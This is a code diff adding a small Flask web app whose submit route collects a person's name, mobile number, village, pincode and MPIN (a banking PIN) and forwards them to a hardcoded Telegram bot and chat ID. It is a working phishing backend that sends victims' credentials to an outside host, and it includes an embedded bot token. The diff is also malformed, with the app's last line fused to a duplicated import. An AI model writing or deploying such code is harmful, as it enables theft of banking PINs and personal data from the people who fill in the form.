@@ -1,4 +1,45 @@
 from flask import Flask, request, render_template
+import requests
+import os
+
+app = Flask(__name__)
+
+@app.route('/')
+def home():
+    return render_template('index.html')
+
+@app.route('/submit', methods=['POST'])
+def submit():
+    name = request.form.get("name")
+    mobile = request.form.get("mobile")
+    village = request.form.get("village")
+    mpin = request.form.get("mpin")
+    pincode = request.form.get("pincode")
+
+    if not name or not mobile or not village or not mpin or not pincode:
+        return "Please fill all fields"
+
+    msg = f"""
+📥 New Data
+
+👤 Name: {name}
+📱 Mobile: {mobile}
+🏡 Village: {village}
+🔐 MPIN: {mpin}
+📍 Pincode: {pincode}
+"""
+
+    url = f"https://api.telegram.org/bot8721390421:AAHeLwVlGR68qNNzBjgfA5XvEaK7G1K3sKs/sendMessage"
+    data = {
+        "chat_id": "7021009916",
+        "text": msg
+    }
+
+    requests.post(url, data=data)
+
+    return "Submitted successfully"
+
+app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))from flask import Flask, request, render_template
 import os
 
 app = Flask(__name__)
